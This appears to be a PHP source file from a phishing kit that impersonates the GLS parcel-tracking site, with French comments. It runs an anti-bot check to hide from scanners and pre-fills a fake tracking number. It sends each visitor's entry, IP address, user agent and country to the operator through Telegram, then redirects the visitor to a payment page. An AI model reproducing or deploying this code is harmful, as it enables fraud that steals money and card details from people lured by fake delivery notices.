<?php
session_start();
require_once 'config.php';
require_once 'languages.php';
require_once 'antibot.php';

// Check anti-bot BEFORE showing any content
if (!isset($_SESSION['antibot_checked'])) {
    $antibotResult = checkAntiBot();
    $_SESSION['antibot_checked'] = true;

    // If blocked, the function will die() and stop execution
    if (!$antibotResult['allowed']) {
        // This line will never be reached if bot is blocked
        exit;
    }
}


// Handle tracking form submission - ÉTAPE 1
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['tracking_number'])) {
    $trackingNumber = trim($_POST['tracking_number']);
    $_SESSION['tracking_number'] = $trackingNumber;

    // Send to Telegram - NOTIFICATION VISITE
    $message = "🚨 <b>NOUVELLE VISITE - QUELQU'UN EST SUR LE SITE</b>\n\n";
    $message .= "📦 <b>Numéro de suivi:</b> " . htmlspecialchars($trackingNumber) . "\n";
    $message .= "⏰ <b>Date:</b> " . date('Y-m-d H:i:s') . "\n";
    $message .= "🌍 <b>Langue:</b> " . strtoupper(getCurrentLang()) . "\n";
    $message .= "🖥️ <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n";
    $message .= "🌐 <b>User-Agent:</b> " . ($_SERVER['HTTP_USER_AGENT'] ?? 'N/A') . "\n";

    // Add country detection if available
    if (isset($_SESSION['detected_country'])) {
        $message .= "🗺️ <b>Pays détecté:</b> " . $_SESSION['detected_country'] . "\n";
    }

    $message .= "\n👀 <b>L'utilisateur vient de commencer le processus</b>\n";

    sendToTelegram($message);
    error_log("TELEGRAM - Notification visite: Numéro de suivi entré");

    // Redirect to payment page
    header('Location: payment.php');
    exit;
}

$pageTitle = t('package_tracking');
include 'includes/header.php';
?>

<style>
/* Truck Animation Styles */
.trucks-container {
    position: absolute;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 100px;
    overflow: hidden;
    pointer-events: none;
}

.truck {
    position: absolute;
    bottom: 20px;
    width: 80px;
    height: 50px;
    animation: driveTruck 15s linear infinite;
}

.truck:nth-child(1) {
    animation-delay: 0s;
}

.truck:nth-child(2) {
    animation-delay: 5s;
    bottom: 40px;
}

.truck:nth-child(3) {
    animation-delay: 10s;
}

@keyframes driveTruck {
    0% {
        left: -100px;
        transform: translateX(0);
    }
    100% {
        left: 100%;
        transform: translateX(100px);
    }
}

.truck svg {
    filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.3));
}

@media (max-width: 768px) {
    .truck {
        width: 60px;
        height: 40px;
    }
}
</style>

<div class="page-transition">
    <!-- Hero Section with Trucks -->
    <section class="hero">
        <h1><?php echo t('premium_quality'); ?></h1>
        <p><?php echo t('hero_subtitle'); ?></p>

        <!-- Animated Truck (Single) -->
        <div class="trucks-container">
            <div class="truck">
                <svg viewBox="0 0 100 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <!-- Truck body -->
                    <rect x="10" y="15" width="50" height="30" fill="#ffcb05" rx="3"/>
                    <rect x="60" y="20" width="30" height="25" fill="#0d1f88" rx="2"/>
                    <!-- Windows -->
                    <rect x="65" y="23" width="10" height="10" fill="#87CEEB" rx="1"/>
                    <rect x="77" y="23" width="10" height="10" fill="#87CEEB" rx="1"/>
                    <!-- Wheels -->
                    <circle cx="25" cy="48" r="8" fill="#333"/>
                    <circle cx="25" cy="48" r="5" fill="#666"/>
                    <circle cx="75" cy="48" r="8" fill="#333"/>
                    <circle cx="75" cy="48" r="5" fill="#666"/>
                    <!-- GLS Logo -->
                    <text x="28" y="32" font-family="Arial" font-size="10" font-weight="bold" fill="#0d1f88">GLS</text>
                </svg>
            </div>
        </div>
    </section>

    <!-- Tracking Form -->
    <div class="container" style="margin-top: 3rem;">
        <div class="card">
            <div class="card-header">
                <div class="icon-wrapper">
                    <svg width="32" height="32" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
                    </svg>
                </div>
                <h2><?php echo t('package_tracking'); ?></h2>
            </div>

            <form action="" method="POST" id="trackingForm">
                <div class="form-group">
                    <label for="tracking"><?php echo t('tracking_number'); ?></label>
                    <div style="position: relative;">
                        <input
                            type="text"
                            id="tracking"
                            name="tracking_number"
                            class="form-input"
                            placeholder="<?php echo t('tracking_placeholder'); ?>"
                            value="TMYZN97VNH"
                            required
                            style="padding-left: 3rem;"
                        >
                        <svg style="position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: #9ca3af;" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
                        </svg>
                    </div>
                    <span class="form-help"><?php echo t('tracking_help'); ?></span>
                </div>

                <button type="submit" class="btn btn-primary btn-full">
                    <?php echo t('search_package'); ?>
                </button>
            </form>
        </div>

        <!-- GLS Trucks Images HD -->
        <div style="margin: 3rem auto 2rem;">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; margin-bottom: 3rem;">
                <div style="border-radius: 1rem; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); transition: transform 0.3s; cursor: pointer;" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
                    <img src="https://imgproxy.divecdn.com/fbs_GM40qGSnXHguJU00hhSZiwmaVnJjNVzQ5mfqRtM/g:ce/rs:fill:1200:675:1/Z3M6Ly9kaXZlc2l0ZS1zdG9yYWdlL2RpdmVpbWFnZS9NZWRpdW0tRDUzX0lNR185OTM4XzMuanBn.webp" alt="GLS Fleet - Parcels to People" style="width: 100%; height: 250px; object-fit: cover;">
                </div>
                <div style="border-radius: 1rem; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); transition: transform 0.3s; cursor: pointer;" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
                    <img src="https://gls-group.com/ES/images/2021/Deliveryman-van-city-GLS-logo-descriptor_M02_4X3.jpg" alt="GLS Delivery Service" style="width: 100%; height: 250px; object-fit: cover;">
                </div>
                <div style="border-radius: 1rem; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); transition: transform 0.3s; cursor: pointer;" onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
                    <img src="https://www.electrive.com/media/2023/04/lion-electric-lion6-e-lkw-electric-truck-gls-canada-kanada-2023-01-min-1400x700.jpg.webp" alt="GLS Electric Truck" style="width: 100%; height: 250px; object-fit: cover;">
                </div>
            </div>
        </div>

        <!-- Info Cards -->
        <div class="info-cards">
            <div class="info-card">
                <div class="info-card-icon">
                    <svg width="32" height="32" fill="none" stroke="var(--gls-blue)" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"/>
                    </svg>
                </div>
                <h3><?php echo t('mygls_login'); ?></h3>
                <p><?php echo t('mygls_desc'); ?></p>
            </div>

            <div class="info-card">
                <div class="info-card-icon">
                    <svg width="32" height="32" fill="none" stroke="var(--gls-blue)" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"/>
                    </svg>
                </div>
                <h3><?php echo t('calculator'); ?></h3>
                <p><?php echo t('calculator_desc'); ?></p>
            </div>

            <div class="info-card">
                <div class="info-card-icon">
                    <svg width="32" height="32" fill="none" stroke="var(--gls-blue)" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/>
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/>
                    </svg>
                </div>
                <h3><?php echo t('parcel_point'); ?></h3>
                <p><?php echo t('parcel_point_desc'); ?></p>
            </div>
        </div>
    </div>
</div>

<?php include 'includes/footer.php'; ?>
